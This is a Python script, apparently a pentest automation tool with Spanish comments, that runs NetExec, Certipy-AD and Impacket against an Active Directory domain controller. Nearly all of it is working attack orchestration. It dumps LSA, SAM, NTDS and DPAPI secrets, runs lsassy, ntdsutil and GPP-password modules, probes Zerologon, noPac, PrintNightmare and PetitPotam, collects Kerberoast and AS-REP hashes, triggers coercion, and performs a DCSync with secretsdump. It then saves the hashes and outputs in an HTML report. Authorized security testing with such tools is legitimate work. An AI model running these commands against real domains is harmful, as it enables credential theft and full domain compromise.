#!/usr/bin/env python3

import argparse
import subprocess
import datetime
import html
import shlex
import sys
import shutil
import time
from pathlib import Path
from typing import Tuple, List

# ---------------------------
# Colores ANSI (incluyendo 256 colores)
# ---------------------------
class Colors:
    MATRIX_GREEN = '\033[38;5;46m'  # Verde brillante estilo Matrix
    BRIGHT_YELLOW = '\033[38;5;226m'  # Amarillo neón brillante
    BLUE = '\033[38;5;33m'  # Azul brillante
    PURPLE = '\033[38;5;129m'  # Púrpura brillante
    RED = '\033[38;5;196m'  # Rojo brillante
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# ---------------------------
# HELP TEXT (epílogo para --help)
# ---------------------------
HELP_TEXT = """
Advulnbusteraudit - ayuda completa
---------------------------------

Descripción
  Este script realiza una auditoría de Active Directory combinando NetExec (nxc)
  con Certipy-AD. Ejecuta enumeración SMB/LDAP, checks de vulnerabilidades (Zerologon,
  NoPAC, PrintNightmare, etc.), recolección de artefactos (LSA, SAM, NTDS, DPAPI si es posible),
  ejecución de certipy-ad para ADCS (si está disponible), y recolección de Kerberoast / ASREPRoast.

Principales funcionalidades incluidas:
  - Enumeración SMB/LDAP (shares, users, groups, computers).
  - Checks SMB: zerologon, petitpotam, nopac, printnightmare, webdav, laps, etc.
  - LDAP/AD checks: dc-list, gMSA, maq, pre2k, delegation, módulo ADCS (netexec) o certipy-ad.
  - Kerberoast / ASREPRoast: guarda en artifacts/kerberoast_<domain>.txt y artifacts/asreproast_<domain>.txt.
  - ADCS: si se selecciona certipy, ejecuta `certipy-ad find -u user@domain -p 'pass'` y parsifica líneas relevantes.
  - Streaming de salida y progreso en tiempo real para evitar bloqueo por TTY/interacción.
  - Informe HTML con salidas completas y tabla ADCS (si aplica).

Requisitos mínimos (recomendado instalar en virtualenv)
  - Python 3.8+ (3.10+ recomendado)
  - netexec (nxc) >= 1.4
  - impacket >= 0.10.0
  - certipy-ad (para ADCS checks con certipy)
  - cryptography, pyOpenSSL, requests

requirements.txt sugerido:
  netexec>=1.4
  impacket>=0.10.0
  certipy-ad
  cryptography
  pyOpenSSL
  requests

Instalación rápida (Kali / Debian)
  sudo apt update
  sudo apt install -y python3 python3-venv python3-pip build-essential python3-dev libssl-dev libffi-dev krb5-user
  python3 -m venv .venv
  source .venv/bin/activate
  pip install --upgrade pip setuptools wheel
  pip install -r requirements.txt
  # opcional: sudo apt install -y certipy-ad

Comprobaciones rápidas:
  which nxc
  which certipy-ad
  python3 --version

Ejemplos de uso
  # Dry-run (muestra comandos sin ejecutarlos)
  python3 advulnbusterauditkali.py --target 10.0.0.5 --domain example.local --user Administrator --password 'P@ss' --dry-run

  # Ejecución completa con certipy-ad para ADCS
  python3 advulnbusterauditkali.py --target 10.0..5 --domain example.local --user Administrator --password 'P@ss' --adcs-tool certipy


Salida esperada
  - Directorio artifacts/ con ficheros generados (kerberoast_*.txt, asreproast_*.txt, adcs_*_certipy.txt, etc)
  - report_audit.html con  salida de comandos.

Advertencia legal
  Ejecuta este script únicamente en entornos donde tengas autorización expresa y únicamente con fines éticos.
"""

COMMANDS = [
    {"name": "SMB enumeration", "commands": [
        # usamos shlex.quote más adelante al formatear
        "nxc smb {target} -d {domain} -u {user} -p {password} --shares --users --groups --computers --no-progress",

        "nxc smb {target} -d {domain} -u {user} -p {password} --lsa --sam --ntds --dpapi --yes --no-progress || true",
    ], "color": Colors.BRIGHT_YELLOW},
    {"name": "SMB vulnerability checks", "commands": [
        "nxc smb {target} -d {domain} -u {user} -p {password} -M zerologon --no-progress || true",
        "nxc smb {target} -d {domain} -u {user} -p {password} -M petitpotam --no-progress || true",
        "nxc smb {target} -d {domain} -u {user} -p {password} -M nopac --no-progress || true",
        "nxc smb {target} -d {domain} -u {user} -p {password} -M printnightmare --no-progress || true",
        "nxc smb {target} -d {domain} -u {user} -p {password} --laps --no-progress || true",
        "nxc smb {target} -d {domain} -u {user} -p {password} -M webdav --no-progress || true",
    ], "color": Colors.BLUE},
    {"name": "LDAP / AD checks", "commands": [
        "nxc ldap {target} -d {domain} -u {user} -p {password} --dc-list --no-progress || true",
        "nxc ldap {target} -d {domain} -u {user} -p {password} --gmsa --no-progress || true",
        "nxc ldap {target} -d {domain} -u {user} -p {password} -M maq --no-progress || true",
        "nxc ldap {target} -d {domain} -u {user} -p {password} -M pre2k --no-progress || true",
        "nxc ldap {target} -d {domain} -u {user} -p {password} --find-delegation --no-progress || true",
        "nxc ldap {target} -d {domain} -u {user} -p {password} -M adcs --no-progress || true",
    ], "color": Colors.BRIGHT_YELLOW},
    {"name": "Post-exploitation / cred-dump modules", "commands": [
        "nxc smb {target} -d {domain} -u {user} -p {password} -M lsassy --no-progress || true",
        "nxc smb {target} -d {domain} -u {user} -p {password} -M ntdsutil --no-progress || true",
        "nxc smb {target} -d {domain} -u {user} -p {password} -M gpp_password --no-progress || true",
    ], "color": Colors.PURPLE},
    {"name": "RDP/WinRM checks", "commands": [
        "nxc rdp {target} -d {domain} -u {user} -p {password} --no-progress || true",
        "nxc winrm {target} -d {domain} -u {user} -p {password} --no-progress || true",
    ], "color": Colors.BLUE},
]

# ---------------------------
# HELPERS
# ---------------------------
def colorize_output(output: str, color: str) -> str:
    """Aplica color a la salida de comandos antes de imprimirla."""
    lines = output.split('\n')
    colored_lines = [f"{color}{line}{Colors.ENDC}" for line in lines]
    return '\n'.join(colored_lines)

def run_streaming(cmd: str, show_stdout: bool = True, timeout: int = 3600, output_color: str = Colors.MATRIX_GREEN) -> Tuple[int, str]:
    """
    Ejecuta un comando y hace streaming de su salida (stdout+stderr) línea a línea.
    Devuelve (rc, full_output).
    No deja al proceso esperando stdin.
    """
    full_out = []
    try:
        proc = subprocess.Popen(cmd, shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT,
                                stdin=subprocess.DEVNULL,
                                text=True,
                                bufsize=1,
                                universal_newlines=True)
    except Exception as e:
        return -1, f"[!] Failed to start command: {e}"

    start = time.time()
    try:
        if proc.stdout:
            for line in proc.stdout:
                out_line = line.rstrip("\n")
                full_out.append(out_line)
                if show_stdout:
                    print(f"{output_color}{out_line}{Colors.ENDC}")
                if timeout and (time.time() - start) > timeout:
                    proc.kill()
                    full_out.append(f"[!] TIMEOUT after {timeout}s")
                    print(f"{Colors.RED}[!] TIMEOUT after {timeout}s{Colors.ENDC}", file=sys.stderr)
                    break
    except Exception as e:
        proc.kill()
        full_out.append(f"[!] Exception while reading output: {e}")
    finally:
        rc = proc.wait()
    return rc, "\n".join(full_out)

def ensure_dir(p: Path) -> Path:
    p.mkdir(parents=True, exist_ok=True)
    return p

def find_certipy_artifacts(art: Path, domain_or_target: str) -> List[Path]:
    pat1 = f"*Certipy*.txt"
    pat2 = f"*certipy*.txt"
    res = []
    for base in (art, Path.cwd()):
        res += list(base.glob(pat1)) + list(base.glob(pat2))
    res_unique = sorted(set(res), key=lambda p: p.stat().st_mtime, reverse=True)
    return res_unique

def extract_relevant(lines: List[str]) -> List[str]:
    keys = ["ESC", "Vulnerable", "Misconfigured", "Template", "Enroll", "EKU", "Authenticated Users", "Domain Users"]
    out = []
    seen = set()
    for ln in lines:
        for k in keys:
            if k.lower() in ln.lower():
                if ln not in seen:
                    seen.add(ln)
                    out.append(ln.strip())
                break
    return out

# ---------------------------
# MAIN
# ---------------------------
def main():
    ap = argparse.ArgumentParser(
        description="advulnbusteraudit - NetExec modules + certipy-ad",
        epilog=HELP_TEXT,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    ap.add_argument("--target", required=True)
    ap.add_argument("--domain", required=True)
    ap.add_argument("--user", required=True)
    ap.add_argument("--password", required=True)
    ap.add_argument("--artifacts-dir", default="./artifacts")
    ap.add_argument("--output", default="report_audit.html")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--adcs-tool", choices=["certipy"], default="certipy")
    args = ap.parse_args()

    artifacts = ensure_dir(Path(args.artifacts_dir))
    domain_or_target = args.domain.replace("/", "_")

    sections_html = []
    adcs_relevant = []
    certipy_paths = []

    # ---------------- Kerberoast / ASREPRoast 
    kerb_cmd = (
        f"nxc ldap {shlex.quote(args.target)} -d {shlex.quote(args.domain)} -u {shlex.quote(args.user)} -p {shlex.quote(args.password)} "
        f"--kerberoasting {shlex.quote(str(artifacts / ('kerberoast_' + domain_or_target + '.txt')))} "
        f"--asreproast {shlex.quote(str(artifacts / ('asreproast_' + domain_or_target + '.txt')))} --no-progress"
    )
    sections_html.append(f"<h2>Kerberoast / ASREPRoast</h2><h3><code>{html.escape(kerb_cmd)}</code></h3><pre>")
    print(f"{Colors.BRIGHT_YELLOW}[+] Preparando Kerberoast/ASREPRoast: {kerb_cmd}{Colors.ENDC}", file=sys.stderr)
    if args.dry_run:
        sections_html[-1] += html.escape("[DRY-RUN] kerberoast/asreproast not executed.\n") + "</pre>"
    else:
        print(f"{Colors.BRIGHT_YELLOW}[+] Ejecutando Kerberoast/ASREPRoast (streaming)...{Colors.ENDC}", file=sys.stderr)
        rc, out = run_streaming(kerb_cmd, output_color=Colors.MATRIX_GREEN)
        sections_html[-1] += html.escape(out) + "</pre>"

        # leer hashes y añadir al informe
        for roastfile in [f"kerberoast_{domain_or_target}.txt", f"asreproast_{domain_or_target}.txt"]:
            path = artifacts / roastfile
            if path.exists():
                data = path.read_text(errors="ignore")
                hashes = [l for l in data.splitlines() if "$krb5" in l or "$krb5asrep$" in l]
                if hashes:
                    sample = "\n".join(hashes[:10])
                    sections_html.append(f"<h3>{roastfile}</h3><pre>" + html.escape(sample) + "</pre>")
                    for h in hashes[:]:
                        if h not in adcs_relevant:
                            adcs_relevant.append(h)

    # ---------------- block commands ----------------
    total_commands = sum(len(b['commands']) for b in COMMANDS) + 1  # +1 for DCSync block appended later
    cmd_counter = 0
    for block in COMMANDS:
        color = block.get("color", Colors.ENDC)
        bh = f"<h2>{html.escape(block['name'])}</h2>"
        for tpl in block["commands"]:
            cmd_counter += 1
            # format with quoted args to avoid shell parsing issues
            cmd = tpl.format(
                target=shlex.quote(args.target),
                domain=shlex.quote(args.domain),
                user=shlex.quote(args.user),
                password=shlex.quote(args.password)
            )
            bh += f"<h3><code>{html.escape(cmd)}</code></h3><pre>"
            header = f"{color}[+] Ejecutando ({cmd_counter}/{total_commands}): {cmd}{Colors.ENDC}"
            print(header, file=sys.stderr)
            bh += html.escape(header + "\n")

            # if ADCS netexec block and we prefer certipy, skip here 
            if ("-M adcs" in tpl or " -M adcs" in tpl) and args.adcs_tool == "certipy":
                bh += html.escape(f"{Colors.BLUE}[INFO] Skipped netexec ADCS because certipy-ad is selected (will run certipy-ad find later).{Colors.ENDC}\n") + "</pre>"
                sections_html.append(bh)
                continue

            if args.dry_run:
                bh += html.escape("[DRY-RUN] not executed\n") + "</pre>"
                sections_html.append(bh)
                continue

            rc, out = run_streaming(cmd + " 2>&1", output_color=Colors.MATRIX_GREEN)
            bh += html.escape(out) + "</pre>"
            sections_html.append(bh)

        
        if block["name"].lower().startswith("ldap"):
            coerce_cmd = (
                f"nxc smb {shlex.quote(args.target)} -u {shlex.quote(args.user)} -p {shlex.quote(args.password)} "
                f"-M coerce_plus -o LISTENER=127.0.0.1 ALWAYS=true --no-progress"
            )
            sections_html.append(f"<h2 style='color:#0066cc'>Coercion techniques (Audit)</h2><h3><code>{html.escape(coerce_cmd)}</code></h3>")
            print(f"{Colors.PURPLE}[+] Ejecutando Coercion techniques (Audit)...{Colors.ENDC}", file=sys.stderr)
            if args.dry_run:
                sections_html.append("<pre>" + html.escape("[DRY-RUN] coerce_plus not executed.\n") + "</pre>")
            else:
                rc_c, out_c = run_streaming(coerce_cmd, output_color=Colors.MATRIX_GREEN)
                sections_html.append("<pre style='background:#eef;border-left:5px solid #007bff;padding:8px'>" + html.escape(out_c) + "</pre>")

    # ---------------- ADCS: certipy-ad find  ----------------
    if args.adcs_tool == "certipy":
        cert_out = artifacts / f"adcs_{domain_or_target}_certipy.txt"
        try:
            if cert_out.exists():
                cert_out.unlink()
        except Exception:
            pass

        upn = args.user if "@" in args.user else f"{args.user}@{args.domain}"
        cert_cmd = f"certipy-ad find -u {shlex.quote(upn)} -p {shlex.quote(args.password)}"
        sections_html.append("<h2>ADCS (certipy-ad find)</h2><pre>")
        print(f"{Colors.BRIGHT_YELLOW}[+] Ejecutando certipy-ad find: {cert_cmd}{Colors.ENDC}", file=sys.stderr)
        if args.dry_run:
            sections_html[-1] += html.escape("[DRY-RUN] certipy-ad find not executed.\n") + "</pre>"
        else:
            rc, out = run_streaming(cert_cmd, output_color=Colors.MATRIX_GREEN)
            # salvamos la salida completa en artifacts
            try:
                cert_out.write_text(out, encoding="utf-8")
            except Exception as e:
                print(f"{Colors.RED}[!] Error escribiendo {cert_out}: {e}{Colors.ENDC}", file=sys.stderr)
            sections_html[-1] += html.escape(out) + "</pre>"

            # localizar artefactos certipy y extraer líneas relevantes
            certipy_paths = find_certipy_artifacts(artifacts, domain_or_target)
            for p in certipy_paths:
                try:
                    txt = p.read_text(errors="ignore").splitlines()
                    rel = extract_relevant(txt)
                    for l in rel:
                        if l not in adcs_relevant:
                            adcs_relevant.append(l)
                except Exception as e:
                    print(f"{Colors.RED}[!] error reading {p}: {e}{Colors.ENDC}", file=sys.stderr)

    # ---------------- DCSync (Impacket) ----------------
    # Ejecutar DCSync con impacket-secretsdump -just-dc; escapamos la contraseña con shlex.quote
    dcsync_cmd = f"impacket-secretsdump {shlex.quote(args.domain)}/{shlex.quote(args.user)}:{shlex.quote(args.password)}@{shlex.quote(args.target)} -just-dc"
    sections_html.append("<h2 style='color:#8b0000'>DCSync (Impacket)</h2><h3><code>" + html.escape(dcsync_cmd) + "</code></h3><pre>")
    print(f"{Colors.RED}[+] Ejecutando DCSync: {dcsync_cmd}{Colors.ENDC}", file=sys.stderr)
    if args.dry_run:
        sections_html[-1] += html.escape("[DRY-RUN] impacket-secretsdump not executed.\n") + "</pre>"
    else:
        rc, out = run_streaming(dcsync_cmd, output_color=Colors.MATRIX_GREEN)
        # write artifact
        try:
            (artifacts / f"dcsync_{domain_or_target}.txt").write_text(out, encoding="utf-8")
        except Exception as e:
            print(f"{Colors.RED}[!] Error escribiendo dcsync artifact: {e}{Colors.ENDC}", file=sys.stderr)
        sections_html[-1] += html.escape(out) + "</pre>"

    # ---------------- Construir tabla ADCS Vulnerabilities ----------------
    vuln_html = ""
    if adcs_relevant:
        vuln_html += "<h2 style='color:#dc3545'>ADCS Vulnerabilities</h2>"
        vuln_html += "<table border='1' style='width:100%;border-collapse:collapse'><tr style='background:#333;color:#fff'><th>#</th><th>Description</th></tr>"
        for i, l in enumerate(adcs_relevant, 1):
            color = "#f8d7da" if "ESC" in l.upper() or "VULNERABLE" in l.upper() else "#fff3cd"
            vuln_html += f"<tr style='background:{color}'><td>{i}</td><td>{html.escape(l)}</td></tr>"
        vuln_html += "</table>"
    else:
        vuln_html = "<h2 style='color:green'>No ADCS vulnerabilities (no relevant lines found)</h2>"

    # relevant pre block (same behavior)
    preblock = ""
    if adcs_relevant:
        preblock += "<h3>Extracto (hallazgos relevantes)</h3><pre style='background:#111;color:#eee;padding:10px;border-radius:6px'>\n"
        for l in adcs_relevant:
            preblock += html.escape(l) + "\n"
        preblock += "</pre>"

    # artifact links (certipy files)
    art_links = ""
    if certipy_paths:
        art_links = "<h3>Certipy artifacts</h3><ul>"
        for p in certipy_paths:
            art_links += f"<li>{html.escape(str(p))}</li>"
        art_links += "</ul>"

    # ---------------- Final HTML ----------------
    html_doc = f"""<!doctype html><html lang='es'><head><meta charset='utf-8'><title>Audit {html.escape(args.target)}</title>
    <style>body{{font-family:Segoe UI,Arial;color:#222;background:#f8f9fa;padding:20px}}pre{{background:#e9ecef;padding:10px;border-radius:6px;overflow:auto}} h2{{color:#0d6efd}}</style></head><body>
    <h1>Advulnbusteraudit by K0B4KS - {html.escape(args.target)}</h1>
    <p><strong>Date:</strong> {datetime.datetime.utcnow().isoformat()} UTC</p>
    <p><strong>Domain:</strong> {html.escape(args.domain)}</p>
    {''.join(sections_html)}
    {vuln_html}
    {preblock}
    {art_links}
    <p><em>Artifacts dir:</em> {html.escape(str(artifacts))}</p>
    </body></html>"""

    Path(args.output).write_text(html_doc, encoding="utf-8")
    print(f"{Colors.BRIGHT_YELLOW}[+] Report written to{Colors.ENDC}", args.output)
    if adcs_relevant:
        print(f"{Colors.RED}[!] Found {len(adcs_relevant)} ADCS relevant lines (see report).{Colors.ENDC}")

if __name__ == "__main__":
    main()
